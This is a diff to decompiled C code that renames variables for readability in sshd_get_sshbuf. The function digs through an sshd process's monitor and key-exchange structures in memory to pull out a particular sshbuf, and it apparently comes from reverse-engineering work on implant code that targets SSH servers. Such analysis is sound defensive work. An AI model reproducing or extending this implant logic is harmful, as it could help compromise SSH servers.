@@ -17,66 +17,66 @@
 BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
 
 {
-  kex *pkVar1;
-  char cVar2;
-  byte bVar3;
-  byte bVar4;
-  monitor *addr;
-  BOOL BVar5;
-  EncodedStringId EVar6;
-  ulong uVar7;
-  ulong uVar8;
-  kex **addr_00;
-  kex *addr_01;
-  u64 length;
-  uint uVar9;
+  kex *pkex_end;
+  char pkex_index;
+  byte size_index;
+  byte data_index;
+  monitor *monitor_ptr;
+  BOOL success;
+  EncodedStringId banner_id;
+  ulong data_field_offset;
+  ulong size_field_offset;
+  kex **pkex_table;
+  kex *pkex_cursor;
+  u64 entry_span;
+  uint banner_matches;
   
   if (sshbuf == (sshbuf *)0x0) {
     return FALSE;
   }
   if (((ctx != (global_context_t *)0x0) && (ctx->struct_monitor_ptr_address != (monitor **)0x0)) &&
-     (BVar5 = is_range_mapped((u8 *)ctx->struct_monitor_ptr_address,8,ctx), BVar5 != FALSE)) {
-    addr = *ctx->struct_monitor_ptr_address;
-    BVar5 = is_range_mapped((u8 *)addr,0x20,ctx);
-    if (BVar5 != FALSE) {
-      cVar2 = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
-      addr_00 = addr->m_pkex;
-      if (-1 < cVar2) {
-        addr_00 = *(kex ***)((long)&addr->m_recvfd + (long)((int)cVar2 << 2));
+     (success = is_range_mapped((u8 *)ctx->struct_monitor_ptr_address,8,ctx), success != FALSE)) {
+    monitor_ptr = *ctx->struct_monitor_ptr_address;
+    success = is_range_mapped((u8 *)monitor_ptr,0x20,ctx);
+    if (success != FALSE) {
+      pkex_index = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
+      pkex_table = monitor_ptr->m_pkex;
+      if (-1 < pkex_index) {
+        pkex_table = *(kex ***)((long)&monitor_ptr->m_recvfd + (long)((int)pkex_index << 2));
       }
-      bVar3 = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
-      bVar4 = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
-      length = 0x48;
-      if (-1 < (char)(bVar4 & bVar3)) {
-        uVar8 = (ulong)((int)(char)bVar3 << 3);
-        uVar7 = (ulong)((int)(char)bVar4 << 3);
-        length = uVar8 + 8;
-        if (uVar8 < uVar7) {
-          length = uVar7 + 8;
+      size_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
+      data_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
+      entry_span = 0x48;
+      if (-1 < (char)(data_index & size_index)) {
+        size_field_offset = (ulong)((int)(char)size_index << 3);
+        data_field_offset = (ulong)((int)(char)data_index << 3);
+        entry_span = size_field_offset + 8;
+        if (size_field_offset < data_field_offset) {
+          entry_span = data_field_offset + 8;
         }
       }
-      BVar5 = is_range_mapped((u8 *)addr_00,8,ctx);
-      if ((BVar5 != FALSE) &&
-         (BVar5 = is_range_mapped(&(*addr_00)->opaque,0x400,ctx), BVar5 != FALSE)) {
-        cVar2 = *(char *)&(ctx->sshd_offsets).field0_0x0;
-        addr_01 = *addr_00;
-        if (cVar2 < '\0') {
-          uVar9 = 0;
-          pkVar1 = addr_01 + 0x400;
-          for (; addr_01 < pkVar1; addr_01 = addr_01 + 8) {
-            BVar5 = is_range_mapped(&addr_01->opaque,length,ctx);
-            if ((BVar5 != FALSE) &&
-               (BVar5 = sshbuf_extract(*(sshbuf **)addr_01,ctx,&sshbuf->d,&sshbuf->size),
-               BVar5 != FALSE)) {
-              if (uVar9 < 2) {
-                EVar6 = get_string_id((char *)sshbuf->d,(char *)(sshbuf->d + 7));
-                if ((EVar6 == STR_SSH_2_0) || (EVar6 == STR_ssh_2_0)) {
-                  uVar9 = uVar9 + 1;
+      success = is_range_mapped((u8 *)pkex_table,8,ctx);
+      if ((success != FALSE) &&
+         (success = is_range_mapped(&(*pkex_table)->opaque,0x400,ctx), success != FALSE)) {
+        pkex_index = *(char *)&(ctx->sshd_offsets).field0_0x0;
+        pkex_cursor = *pkex_table;
+        if (pkex_index < '\0') {
+          banner_matches = 0;
+          pkex_end = pkex_cursor + 0x400;
+          for (; pkex_cursor < pkex_end; pkex_cursor = pkex_cursor + 8) {
+            success = is_range_mapped(&pkex_cursor->opaque,entry_span,ctx);
+            if ((success != FALSE) &&
+               (success = sshbuf_extract(*(sshbuf **)pkex_cursor,ctx,&sshbuf->d,&sshbuf->size),
+               success != FALSE)) {
+              if (banner_matches < 2) {
+                banner_id = get_string_id((char *)sshbuf->d,(char *)(sshbuf->d + 7));
+                if ((banner_id == STR_SSH_2_0) || (banner_id == STR_ssh_2_0)) {
+                  banner_matches = banner_matches + 1;
                 }
               }
               else {
-                BVar5 = sshbuf_bignum_is_negative(sshbuf);
-                if (BVar5 != FALSE) {
+                success = sshbuf_bignum_is_negative(sshbuf);
+                if (success != FALSE) {
                   return TRUE;
                 }
               }
@@ -84,11 +84,11 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
           }
         }
         else {
-          BVar5 = sshbuf_extract(*(sshbuf **)(addr_01 + ((int)cVar2 << 3)),ctx,&sshbuf->d,
+          success = sshbuf_extract(*(sshbuf **)(pkex_cursor + ((int)pkex_index << 3)),ctx,&sshbuf->d,
                                  &sshbuf->size);
-          if (BVar5 != FALSE) {
-            BVar5 = sshbuf_bignum_is_negative(sshbuf);
-            return (uint)(BVar5 != FALSE);
+          if (success != FALSE) {
+            success = sshbuf_bignum_is_negative(sshbuf);
+            return (uint)(success != FALSE);
           }
         }
       }
